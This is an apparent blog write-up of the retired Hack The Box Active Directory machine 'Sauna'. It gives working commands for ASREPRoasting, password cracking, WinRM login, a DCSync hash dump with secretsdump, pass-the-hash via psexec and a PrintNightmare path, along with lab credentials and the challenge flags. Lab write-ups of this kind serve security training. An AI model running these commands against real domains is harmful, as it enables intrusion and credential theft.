---
layout: writeup
name: "Sauna"
platform: "HackTheBox"
category: "retired"
difficulty: "Easy"
permalink: /writeups/retired/sauna/
os: "Hack The Box"
tags: [Windows / Active Directory]
date: 2026-02-25
pwned: true
---
# 🧪 Machine Name: Sauna

**Platform:** Hack The Box  
**IP Address:** 10.129.95.180  
**Difficulty:** Easy  
**Category:** Windows / Active Directory

---

## 🧭 Overview

Sauna is an Easy-rated Windows Active Directory machine that starts with username enumeration from a company website and leads into ASREPRoasting. Once initial access is gained via WinRM using a cracked password, privilege escalation is achieved by identifying autologon credentials and using BloodHound to find DCSync rights. The box can also be rooted via PrintNightmare.

---

## 🔍 Enumeration

- Port 80 hosts a company website listing employee names.
- ASREPRoasting on `fsmith` via `GetNPUsers.py` yields a crackable hash.
- WinRM is open on port 5985 and allows access with cracked credentials.
- `winPEAS` reveals stored autologon creds for `svc_loanmgr`.
- BloodHound shows `svc_loanmgr` has `DS-Replication-Get-Changes-All`, enabling DCSync.
- Using `secretsdump.py`, we dump the Administrator hash.
- We then use `psexec.py` with the dumped hash to gain a SYSTEM shell.

---

## 🧪 Exploitation

### Initial Access
```bash
GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -dc-ip $target -usersfile users.txt -outputfile hashes.txt
john --wordlist=rockyou.txt hashes.txt
evil-winrm -i $target -u fsmith -p Thestrokes23
```

### Privilege Escalation Path 1 (Intended)
```bash
# Grab autologon creds with winPEAS
# Login as svc_loanmgr
# Dump domain hashes with secretsdump
secretsdump.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr:'Moneymakestheworldgoround!'@$target
psexec.py EGOTISTICAL-BANK.LOCAL/Administrator@$target -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
```

### Privilege Escalation Path 2 (Alternative)
```bash
# Use PrintNightmare to create a new admin user
Invoke-Nightmare via Evil-WinRM
evil-winrm -i $target -u adm1n -p 'P@ssw0rd'
```

---

## 📜 Flags

- `user.txt`: `d877e054079380297969152d0bfa7750`
- `root.txt`: `291b6896f3974bbef8b42b7805735bcc`

---

## 🎓 Lessons Learned

- Kerberoasting and ASREPRoasting are common foothold techniques on AD boxes.
- Username generation tools combined with website content are effective.
- PrivEsc via DCSync is textbook — always check for replication rights!
- PrintNightmare still works as an unintended path on many HTB boxes.
